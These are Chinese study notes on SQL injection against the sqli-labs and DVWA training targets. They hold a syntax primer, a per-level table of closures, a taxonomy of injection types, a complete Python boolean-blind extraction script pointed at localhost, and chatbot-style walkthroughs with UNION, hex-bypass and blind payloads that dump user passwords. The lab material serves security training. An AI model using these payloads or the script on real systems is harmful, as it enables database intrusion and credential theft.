# sql-labs通关教程[](https://www.cnblogs.com/xuanxian/articles/19105912)
# 语法

> [!note] 
> - `select a,b;` 显示a,b; `select a,b from c` 从c表中提取列a,b数据
> - `ascii(character)` 返回character首字符ascii码
> - `substr(str, begin, num)` 从str的第begin个字符开始，取num个字符
> - 注释方法
> 	- `--+` <mark style="background: #FF5582A6;">url中</mark>注释掉后面的代码，+在url中是空格，--后面加空格语法才对
> 	- `-- ` url以外的表单提交内容，注意后面有一个空格
> 	- `#` 同 `-- `
> - `limit i,j` 跳过前i行，共取j行
# 查找数据库和表格

哈哈，这个问题问得太好了！很多初学者在学 SQL 注入时，最懵的就是这个 `information_schema`，感觉像变魔术一样。

其实一点都不神秘！你可以把 MySQL 数据库想象成一个**巨大的“图书馆”**。

### 🏛️ 数据库到底长什么样？

1. **Database（数据库） = 图书馆的“大楼”**  
    你现在的 DVWA，就是其中一栋楼，它的名字叫 `dvwa`。
2. **Table（表） = 楼里的“书架”**  
    在 `dvwa` 这栋楼里，有不同的书架。比如 `users` 书架上放着所有用户的账号密码，`guestbook` 书架上放着留言板。
3. **Column（列/字段） = 书架上的“文件夹”**  
    在 `users` 书架上，有 `username`（用户名）文件夹，`password`（密码）文件夹。
4. **Row（行/数据） = 文件夹里的“具体文件”**  
    比如 `admin` 的账号密码，就是一份具体的文件。

---

### 📖 那么 `information_schema` 是什么？

为了让别人知道这个图书馆里有什么书，MySQL 官方在每一栋楼里，都强行塞了一本**“图书馆总目录”**，它的名字就叫 `information_schema`。

这本“总目录”里有两个非常关键的“书架”（系统表）：

- **`tables` 表**：记录了所有图书馆（数据库）里有哪些书架（表名）。
- **`columns` 表**：记录了所有书架（表）里有哪些文件夹（列名）。

---

### 🔍 我们来逐字拆解你的“查表名”咒语

现在我们来看这句让你头疼的代码：  
`id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()&Submit=Submit`

把它翻译成大白话，就是黑客在向数据库下达的指令：

1. **`id=0 union select 1,...`**
    - **大白话**：“我不查 ID 为 0 的数据了（因为 0 不存在，原查询返回空），我要用 `UNION` 拼接一段我自己的查询！”
2. **`from information_schema.tables`**
    - **大白话**：“我要去翻阅那本**‘图书馆总目录’**里的**‘表名清单’**。”
3. **`where table_schema=database()`**
    - **大白话**：“但是总目录里记录了全世界所有的数据库，太乱了。我只要当前这个大楼（也就是 `dvwa`）的清单！”
    - _(注：`database()` 是一个函数，它会自动获取当前所在的数据库名，相当于代替了写死 `dvwa`)_
4. **`group_concat(table_name)`**
    - **大白话**：“把查出来的所有书架名字（表名），用逗号连成一长串，一次性全给我显示出来！”

---

### 💡 总结一下整个过程

当你输入这段代码时，你其实是在对数据库说：

> “嘿，数据库！我不查 ID 了。你去翻翻你的**总目录（information_schema）**，看看**当前这栋楼（database()）**里面，到底**建了哪些书架（table_name）**，把它们的名字全都给我列出来！”

数据库一听，乖乖地执行了，然后页面就会显示出：`users, guestbook`。

**黑客的逻辑链就是这么简单：**  
查到了大楼名（`dvwa`） ➡️ 翻目录查到了书架名（`users`） ➡️ 再翻目录查到了文件夹名（`username, password`） ➡️ 最后直接去 `users` 书架把文件全偷走！

怎么样？把数据库想象成图书馆，是不是瞬间就通透了？

---

要不要我帮你整理一份常用字符串的十六进制对照表？注入的时候直接复制粘贴就行。
# sql-labs各关卡闭合和攻击方式

| 关卡      | 注入位置       | 闭合方式          | 攻击方式               |
| ------- | ---------- | ------------- | ------------------ |
| Less-1  | GET 参数     | `'` + `--+`   | UNION / 报错         |
| Less-2  | GET 参数     | 无引号           | UNION / 报错         |
| Less-3  | GET 参数     | `')` + `--+`  | UNION / 报错         |
| Less-4  | GET 参数     | `")` + `--+`  | UNION / 报错         |
| Less-5  | GET 参数     | `'`           | 报错注入（单行回显）         |
| Less-6  | GET 参数     | `"`           | 报错注入               |
| Less-7  | GET 参数     | `'`           | 文件导出（into outfile） |
| Less-8  | GET 参数     | `'` + `#`     | 布尔盲注               |
| Less-9  | GET 参数     | `'` + `#`     | 时间盲注               |
| Less-10 | GET 参数     | `"` + `#`     | 时间盲注               |
| Less-11 | POST 登录框   | `'`           | UNION / 报错         |
| Less-12 | POST 登录框   | `")`          | UNION / 报错         |
| Less-13 | POST 登录框   | `')`          | 报错注入               |
| Less-14 | POST 登录框   | `"`           | 报错注入               |
| Less-15 | POST 登录框   | `'`           | 布尔盲注               |
| Less-16 | POST 登录框   | `"`           | 时间盲注               |
| Less-17 | POST 密码修改  | `'`           | 报错注入               |
| Less-18 | User-Agent | `'` + `and '` | 报错注入               |
| Less-19 | Referer    | `'` + `and '` | 报错注入               |
| Less-20 | Cookie     | `'`           | UNION / 报错         |
# 注入方法

### 1. 按注入点的数据类型分类

这是最基础的分类，决定了攻击者如何“闭合”SQL语句：

- **数字型注入（整数型注入）**：输入参数为数字，无需引号闭合。例如直接拼接 `AND 1=1` 或 `OR 1=1`。
- **字符型注入**：输入参数为字符串，需要使用单引号 `'` 或双引号 `"` 进行闭合。
- **搜索型注入**：常见于网站的搜索框，通常涉及 `LIKE` 语句，需要使用 `%` 和引号进行闭合。

### 2. 按数据提交的位置分类

决定了攻击载荷（Payload）应该放在哪里：

- **GET 注入**：参数在 URL 查询字符串中传递。
- **POST 注入**：参数在 HTTP 请求体中传递。
- **HTTP Header 注入**：利用 User-Agent、Referer、X-Forwarded-For 等请求头字段进行注入。
- **Cookie 注入**：利用未过滤的 Cookie 数据进行注入。
#### 请求头为何会并入数据库
很多网站都有“用户行为分析”或“安全审计”功能。比如：
- 记录用户是从哪个页面跳转过来的（Referer）。
- 记录用户使用的是什么手机、什么浏览器（User-Agent）。
- 记录用户的登录 IP。
### 3. 按获取数据的方式（回显情况）分类

这是实战中最核心的分类，决定了攻击者“如何把数据偷出来”：

#### A. 有回显注入（带内注入）

前端页面能够直接展示数据库查询的结果或错误信息：

- **联合查询注入（Union-based）**：利用 `UNION SELECT` 将恶意查询结果拼接到正常页面中显示。
- **报错注入（Error-based）**：**利用数据库的报错机制回显数据**。攻击者故意构造错误的 SQL 语句（如利用 `extractvalue()`、`updatexml()` 等函数触发 XPath 语法错误），迫使数据库将敏感数据（如库名、表名）包含在报错信息中返回给前端。
##### 1. 页面有报错信息，但无数据回显

这是最典型的适用场景。当你输入恶意代码后，页面不会像联合查询注入那样直接显示数据库里的数据，但是会弹出详细的数据库错误提示（如 `XPATH syntax error` 或 `Duplicate entry`）。此时，你可以利用报错函数（如 `updatexml()`、`extractvalue()`）将敏感数据拼接到错误信息中“逼”出来。

##### 2. 联合查询注入（Union Injection）失效

当页面只返回单行数据，或者程序只取第一条记录时，你的 `UNION SELECT` 结果可能无法显示在页面上。此时，如果页面开启了错误回显（如 PHP 的 `display_errors=On`），报错注入是绝佳的替代方案。

##### 3. 盲注（Blind Injection）效率太低

当页面既没有数据回显，也没有报错信息时，通常只能使用布尔盲注或时间盲注。但这两种方法需要逐字符猜解，效率极低（一个库名可能要猜几百次）。如果你能想办法触发数据库报错（例如故意构造语法错误），就可以将“盲注”转化为“报错注入”，从而一次性获取数据，大幅提升攻击效率。

##### 4. 成功触发 UPDATE/INSERT 等更新操作

正如你在 SQLi-Labs Less-17 中遇到的情况，当后端执行的是 `UPDATE` 语句时，无法直接使用联合查询。如果此时页面依然会回显数据库报错，你就可以在更新语句中嵌套报错函数，在更新数据的同时窃取信息。
#### B. 无回显注入（盲注 / Blind Injection）

前端页面没有任何数据回显，甚至没有报错信息，攻击者只能通过页面的“微小差异”来推断数据：

- **布尔盲注（Boolean-based）**：页面没有数据，但会根据 SQL 语句的真假返回“正常页面”或“错误/空白页面”。攻击者通过逐位猜解字符的 ASCII 码来还原数据。
- **时间盲注（Time-based）**：页面无论真假都返回完全一样的内容。攻击者利用 `sleep()` 或 `benchmark()` 等延时函数，通过观察页面响应的“时间长短”来判断 SQL 语句的真假。

#### C. 带外注入（Out-of-band）

当数据库响应极不稳定，且无法使用上述同一信道获取结果时使用：

- **DNSLog 盲注**：利用数据库的特定功能（如 MySQL 的 `load_file`）发起外部 DNS 请求，将窃取的数据发送到攻击者控制的 DNSLog 平台上。

### 4. 其他特殊注入手法

- **堆叠注入（Stacked Queries）**：利用分号 `;` 执行多条 SQL 语句，常用于执行 `DROP`、`INSERT` 或系统命令。
- **二次注入（Second-order Injection）**：第一次插入恶意数据时被转义安全存入数据库，但在第二次读取并拼接时触发注入。
- **宽字节注入**：利用 GBK 等多字节编码特性（如 `%df%27`），吃掉转义的反斜杠，从而绕过单引号过滤。


# 盲注脚本
```python
import requests

#需要爆破的网址
url = 'http://127.0.0.1/sqli-labs-master/Less-8/'

#请求头，避免被反爬
headers = {
    "user-agent":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36 Edg/139.0.0.0"
}

#爆破成功后页面的回显（请确认这是唯一的，失败网页里面不会有）
flag = 'You are in....'

#设置最长库、表名
max_len = 20

# #0-9a-zA-Z的ascii码列表
# keylist = [ord(i) for i in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz']

#0-9a-z的ascii码列表
keylist = [ord(i) for i in '0123456789_abcdefghijklmnopqrstuvwxyz']

#创建对话，用于保持请求
session = requests.Session()

#设置代理服务器
# session.proxies={
#     'http': 'http://127.0.0.1:10808',
# }



#检查本次请求是否包含flag
def check(payload):
    #请求参数
    params = {
        "id": payload
    }
#普通get请求
    response = requests.get(url, headers=headers, params=params, timeout=10)
#普通post请求
    # response = requests.post(url, headers=headers, data=payload, timeout=10)
#session get请求
    # response = session.get(url, headers=headers, params=params, timeout=10)
#session post请求
    # response = session.post(url, data=params, headers = headers, timeout=10)

    #print(response.text)
    return flag in response.text



def get_database():
    db_name = ''
    print("---------开始爆破当前数据库---------")
    #依次爆破数据库每个字母，默认爆破次数为20
    for i in range(max_len):
        char=''
        l, r = 0, len(keylist)
        print(f'正在爆破第{i+1}个字符')
        while l < r:
            mid = (l+r)//2
            ascii_char = keylist[mid]
# select xx from xx where id = '1' ascii(substr(database(),1,1)) = char#' limit 0,1    拼接后的sql语句
            payload1 = f"1' and ascii(substr(database(),{i+1},1))={ascii_char}#"
            payload2 = f"1' and ascii(substr(database(),{i+1},1))>{ascii_char}#"

            if check(payload1):
                char=chr(ascii_char)
                db_name += char
                print(f'爆破成功,第{i+1}个字符为{chr(ascii_char)}')
                break
            elif check(payload2):
                l = mid + 1
            else:
                r = mid
        if not char:
            print('已爆破完毕')
            break
    print(f'数据库名称为:{db_name}')
    print("---------------------------")
    return db_name


def get_databases():
    lst=[]
    print('-------开始爆破所有数据库-------')
    for i in range(max_len):
        print(f'-----正在爆破第{i+1}个数据库的名称-----')
        database_name=''
        for j in range(max_len):
            char=''
            l, r = 0, len(keylist)
            while l < r:
                mid = (l+r)//2
                ascii_char = keylist[mid]

                payload1 = f"1' and ascii(substr((select schema_name from information_schema.schemata limit {i},1),{j + 1},1))={ascii_char}#"
                payload2 = f"1' and ascii(substr((select schema_name from information_schema.schemata limit {i},1),{j + 1},1))>{ascii_char}#"

                if check(payload1):
                    char=chr(ascii_char)
                    database_name += char
                    print(f'爆破成功,第{j + 1}个字符为{char}')
                    break
                elif check(payload2):
                    l = mid + 1
                else:
                    r = mid
            if not char:
                break
        if not database_name:
            break
        print(f'数据库名称为:{database_name}')
        lst.append(database_name)
    return lst


def get_tables(database):
    lst=[]
    for i in range(max_len):
        table_name=''
        for j in range(max_len):
            char=''
            l, r = 0, len(keylist)
            while l < r:
                mid = (l+r)//2
                ascii_char = keylist[mid]

                payload1 = f"1' and ascii(substr((select table_name from information_schema.tables where table_schema='{database}' limit {i},1),{j + 1},1))={ascii_char}#"
                payload2 = f"1' and ascii(substr((select table_name from information_schema.tables where table_schema='{database}' limit {i},1),{j + 1},1))>{ascii_char}#"

                if check(payload1):
                    char=chr(ascii_char)
                    table_name += char
                    print(f'爆破成功,第{j + 1}个字符为{char}')
                    break
                elif check(payload2):
                    l = mid + 1
                else:
                    r = mid
            if not char:
                break
        if not table_name:
            break
        print(f'表名名称为:{table_name}')
        lst.append(table_name)
    return lst


def get_columns(database,table):
    lst=[]
    for i in range(max_len):
        column_name=''
        for j in range(max_len):
            char=''
            l, r = 0, len(keylist)
            while l < r:
                mid = (l+r)//2
                ascii_char = keylist[mid]

                payload1 = f"1' and ascii(substr((select column_name from information_schema.columns where table_schema='{database}' and table_name='{table}' limit {i},1),{j + 1},1))={ascii_char}#"
                payload2 = f"1' and ascii(substr((select column_name from information_schema.columns where table_schema='{database}' and table_name='{table}' limit {i},1),{j + 1},1))>{ascii_char}#"

                if check(payload1):
                    char=chr(ascii_char)
                    column_name += char
                    print(f'爆破成功,第{j + 1}个字符为{char}')
                    break
                elif check(payload2):
                    l = mid + 1
                else:
                    r = mid
            if not char:
                break
        if not column_name:
            break
        print(f'字段名名称为:{column_name}')
        lst.append(column_name)
    return lst


#默认只查询10个数据（times）
def get_datas(database,table,column,time=3):
    lst = [column,]
    for i in range(time):
        data = ''
        for j in range(max_len):
            char = ''
            l, r = 0, len(keylist)
            while l < r:
                mid = (l + r) // 2
                ascii_char = keylist[mid]

                payload1 = f"1' and ascii(substr((select {column} from {database}.{table} limit {i},1),{j + 1},1))={ascii_char}#"
                payload2 = f"1' and ascii(substr((select {column} from {database}.{table} limit {i},1),{j + 1},1))>{ascii_char}#"

                if check(payload1):
                    char = chr(ascii_char)
                    data += char
                    print(f'爆破成功,第{j + 1}个字符为{char}')
                    break
                elif check(payload2):
                    l = mid + 1
                else:
                    r = mid
            if not char:
                break
        if not data:
            break
        print(f'数据为:{data}')
        lst.append(data)
    return lst


if __name__ == '__main__':
    print('sql盲注脚本开始运行')
    database = get_database()
    # databases = get_databases()

    while True:
        print(f'当前数据库:{database}')
        # print(f'数据库列表:{databases}')

        database = input('请输入想爆破的数据库名称\n')
        tables = get_tables(database)
        print(f'表名:{tables}')

        table = input('请输入想要爆破的表名\n')
        columns = get_columns(database,table)
        print(f'字段名:{columns}')

        column_lst = input('请输入想要托取的字段,请以空格分开\n').split()
        i = 0
        dic = {}

        for column in column_lst:
            lst_name = f'data_{i+1}'
            i+=1
            dic[lst_name] = get_datas(database,table,column)

        for key in dic.keys():
            print(dic[key])
        choose = int(input('输入1继续，输入0退出\n'))
        if not choose:
            break
    print('脚本运行结束')

```
# low
太好了！万丈高楼平地起，我们从最经典的 **SQL 注入（SQL Injection）** 开始。这也是你一开始就提到的重点。

在 DVWA 中，SQL 注入分为 Low、Medium、High、Impossible 四个难度。我们现在先从 **Low（最低难度）** 开始，体验一下最纯粹的漏洞利用。

---

### 🎯 第一步：设置难度并了解靶场

1. 在 DVWA 左侧菜单栏点击 **DVWA Security**。
2. 将安全级别（Security Level）拉到 **Low**，然后点击 **Submit**。
3. 点击左侧的 **SQL Injection** 模块。
4. 你会看到一个输入框，提示你输入一个 `User ID`。

---

### 🔍 第二步：正常测试（了解业务逻辑）

在输入框中输入 `1`，点击 `View Details`。

- 页面会显示：`User ID: 1`，`First name: admin`，`Surname: admin`。
- **分析：** 这说明后台把我们的输入 `1` 拼接到了一条 SQL 语句中，去数据库里查询了 `users` 表。

---

### 💥 第三步：开始攻击（判断是否存在漏洞）

SQL 注入的核心思想是：**闭合原有的 SQL 语句，并注入我们自己的恶意代码。**

1. **测试单引号：**  
    在输入框中输入：`1'` ，点击查询。
    
    - **结果：** 页面报错，出现类似 `You have an error in your SQL syntax...` 的提示。
    - **结论：** 报错说明存在 SQL 注入漏洞！因为单引号破坏了原本的 SQL 语法。
2. **判断字段数（ORDER BY 报错法）：**  
    输入：`1 ORDER BY 1#`
    
    - **结果：** 正常返回数据。  
        输入：`1 ORDER BY 2#`
    - **结果：** 正常返回数据。  
        输入：`1 ORDER BY 3#`
    - **结果：** 报错。
    - **结论：** 说明查询语句只查了 2 个字段（即 `User ID` 和 `First name, Surname` 合并展示）。`#` 是 MySQL 的注释符，用来把后面的代码注释掉。

---

### 🛠️ 第四步：利用漏洞（联合查询 UNION SELECT）

既然知道了查了 2 个字段，我们就可以用 `UNION SELECT` 来查询我们想要的数据。

1. **让原查询失效：**  
    输入：`1' AND 1=2#`
    
    - **结果：** 页面空白，没有返回数据。（因为 1=2 是假的，原查询没结果，但页面不报错了）。
2. **注入我们的查询：**  
    输入：`1' AND 1=2 UNION SELECT user, password FROM users#`
    
    - **结果：** 页面会列出数据库中所有用户的账号和明文密码（或 MD5 哈希值）！

---

### 💡 核心原理解析（为什么能成功？）

在 Low 难度下，PHP 后台的代码大概是这样的：

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

当我们输入 `1' AND 1=2 UNION SELECT user, password FROM users#` 时，最终发给 MySQL 的语句变成了：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 UNION SELECT user, password FROM users#';
```

`#` 把最后那个多余的单引号注释掉了，完美执行了我们的恶意查询！

---

**🚀 你的第一个实战任务：**  
请按照上面的步骤，在你的 DVWA 中实操一遍。特别是最后一步，尝试把数据库里所有的账号密码都“偷”出来。

完成后告诉我，或者如果在输入时遇到了什么奇怪的报错，随时发给我。搞定这个，我们马上进阶 **Medium 难度**！


# medium
太棒了！你已经准备好进阶了。

在 DVWA 中，**Medium（中等难度）** 的 SQL 注入与 Low 难度相比，最大的变化是开发者加了“防护”。

### 🔍 Medium 难度的核心变化：

1. **请求方式改变：** 输入框变成了**下拉菜单（Dropdown）**，请求方式从 GET 变成了 **POST**。
2. **过滤了单引号：** 后台代码使用了 `mysql_real_escape_string()` 函数，把你输入的单引号 `'` 转义成了 `\'`，导致我们在 Low 难度下用的单引号闭合失效了。
3. **变成了数字型注入：** 后台的 SQL 语句去掉了包裹变量的单引号（变成了 `user_id = $id`），这意味着我们**根本不需要用单引号去闭合**，直接进行数字型注入即可。

---

### 🛠️ 准备工作：使用 Burp Suite 抓包

因为现在是下拉菜单，我们没法直接在页面上输入代码，必须借助 **Burp Suite** 拦截并修改请求。

1. 将 DVWA 的安全级别设置为 **Medium**。
2. 打开 Burp Suite，配置好浏览器代理，确保能拦截到流量。
3. 在 DVWA 页面随便选择一个 User ID，点击 `View Details`，此时 Burp Suite 会拦截到这个 POST 请求。

---

### 💥 攻击步骤（在 Burp Suite 的 Repeater 中进行）：

拦截到请求后，你会看到类似 `id=1&Submit=Submit` 的数据。我们把 `id=1` 替换为以下 Payload 进行测试：

#### 第一步：判断注入类型（数字型注入）

在 Low 难度我们用的是 `1' and 1=1#`，现在单引号被过滤了，我们直接去掉单引号：

- 输入：`id=1 and 1=1&Submit=Submit` -> 页面正常返回数据。
- 输入：`id=1 and 1=2&Submit=Submit` -> 页面返回为空或报错。
- **结论：** 存在数字型注入，不需要单引号！

#### 第二步：判断字段数

- 输入：`id=1 order by 2&Submit=Submit` -> 正常。
- 输入：`id=1 order by 3&Submit=Submit` -> 报错。
- **结论：** 依然是 2 个字段。

#### 第三步：联合查询（UNION SELECT）

注意：因为是数字型注入，前面必须保留一个数字（比如 `0` 或 `1`），否则 SQL 语法会报错。

- 输入：`id=0 union select 1,2&Submit=Submit`
- **预期结果：** 页面正常显示数字 `1` 和 `2`，说明这两个位置都可以用来回显数据。

#### 第四步：获取数据库信息

- **查库名：** `id=0 union select 1,database()&Submit=Submit`
- **查表名：** `id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()&Submit=Submit` 
> [!note] 
> 避免dvwa 和sql 字符集排序冲突，在 `group_concat(table_name)`和`COLLATE utf8_general_ci`
> - where
> 	- `TABLE_SCHEMA`：所属数据库（哪栋楼）。
> 	- `TABLE_NAME`：所属表（哪个书架）。
> 	- `COLUMN_NAME`：列的名字（文件夹的名字）。 

---

### ⚠️ Medium 难度最容易踩的坑（高能预警）：

当你试图查询 `users` 表的字段或数据时，你可能会写出这样的代码：  
`id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'&Submit=Submit`

**这时候绝对会报错！** 为什么？  
因为你的 Payload 里面又出现了单引号 `'users'`，它会被后台的 `mysql_real_escape_string()` 转义掉！

**💡 破局绝招：使用 Hex（十六进制）编码绕过**  
既然单引号不能用，我们可以把字符串 `users` 转换成十六进制格式 `0x7573657273`，MySQL 会自动识别它。

- **查 users 表的字段名（完美绕过单引号）：**
    
    ```text
    id=0 union select 1,group_concat(column_name) COLLATE utf8_general_ci from information_schema.columns where table_name=0x7573657273&Submit=Submit
    ```
    
- **直接脱裤（提取账号和密码）：**
    
    ```text
    id=0 union select user,password from users&Submit=Submit
    ```
    
    _(注意：这里不需要写 `from 0x...`，因为 `users` 是默认库里的表，直接写表名即可；如果非要写，也可以写成 `0x7573657273`)_

---

**🚀 你的进阶任务：**  
打开 Burp Suite，把安全级别调到 Medium，按照上面的步骤，**不使用任何一个单引号**，把 `dvwa` 数据库里的账号密码全部“偷”出来！

去实操一下吧！如果遇到 `Illegal mix of collations` 报错，或者单引号绕过失败，随时把报错信息发给我！



# high
太棒了！恭喜你成功通关 DVWA 的 Medium（中等难度）！

在 Medium 难度中，你不仅掌握了数字型注入，还学会了使用 Burp Suite 抓包改包，甚至掌握了用十六进制（Hex）绕过单引号过滤的高级技巧。这说明你已经脱离了“只会复制粘贴 Payload”的新手阶段，具备了真正的“黑客思维”。

接下来，我们将进入 **DVWA 的 High（高难度）级别**。这一关的防护手段更加复杂，非常接近真实的 CTF 比赛场景。

### 🛡️ High 难度的核心变化：

1. **Session 传参（最坑的一点）：** 开发者为了防止你抓包改参数，把 ID 的获取方式从 POST 请求体改成了**基于 Session 的弹窗传参**。这意味着你直接在 Burp 里改 POST 包可能没用了。
2. **强制 LIMIT 1：** 后台代码在 SQL 语句末尾强行加上了 `LIMIT 1`。这意味着即使你的注入语句成功了，数据库也**只会返回 1 行数据**。你无法再用 `UNION SELECT` 一次性把整张表的数据“脱”出来。
3. **特殊字符转义：** 后台依然对单引号等字符进行了严格的转义处理。

---

### 🚀 下一阶段（High 难度）核心实战任务：

面对 `LIMIT 1` 的限制，黑客必须掌握一种全新的技能——**盲注（Blind SQL Injection）**。在 High 难度下，我们主要练习**布尔盲注**。

#### 第一步：绕过 LIMIT 1（注释符大法）

既然末尾有 `LIMIT 1` 限制我们，我们就用注释符 `#` 把它后面的代码全部“屏蔽”掉！

- **测试 Payload：** 在弹窗中输入 `1' or '1'='1 #`
- **原理解析：** 这里的 `#` 会把后台原本拼接的 `' LIMIT 1;` 变成注释。如果页面返回了数据，说明注入点存在且成功绕过了限制。

#### 第二步：判断真假（布尔盲注）

因为 `LIMIT 1` 的存在，你无法用 `UNION SELECT` 看回显了。你只能通过**页面的反应（有数据 vs 没数据）**来判断你的条件是否成立。

- **测试真条件：** `1' and 1=1 #` （页面应该正常返回 1 条数据）
- **测试假条件：** `1' and 1=2 #` （页面应该为空或显示无结果）

#### 第三步：逐字符“猜”数据（高阶玩法）

既然一次只能查一条数据，我们就利用 `substr()`（截取字符串）和 `ascii()`（转 ASCII 码）函数，一个字母一个字母地去猜数据库的名字。

- **猜数据库名长度：** `1' and length(database())=4 #` （如果页面正常，说明库名是 4 个字母）
- **猜第一个字母：** `1' and ascii(substr(database(),1,1))=100 #` （100 是字母 'd' 的 ASCII 码，如果正常，说明库名以 'd' 开头，也就是 `dvwa`）

---

### 🛠️ 你的 High 难度实操指南：

1. 将 DVWA 安全级别调整为 **High**。
2. 点击输入框，在弹出的新窗口中输入上述 Payload 进行测试。
3. **注意：** 因为是通过弹窗提交，Burp Suite 拦截的可能是 GET 请求，你需要在 Burp 的 Repeater 模块中修改 URL 参数（例如 `?id=1'%20and%201=1%20#`，注意空格要编码为 `%20`）。

**准备好迎接真正的挑战了吗？**  
你现在可以先去 High 难度下试试 `1' or '1'='1 #`，看看能不能成功绕过 `LIMIT 1` 的限制！如果遇到页面没反应或者报错，随时把现象告诉我，我带你一步步拆解！



# SQLi-Labs[](https://blog.csdn.net/dreamthe/article/details/123795302?fromshare=blogdetail&sharetype=blogdetail&sharerId=123795302&sharerefer=PC&sharesource=weixin_49159748&sharefrom=from_link)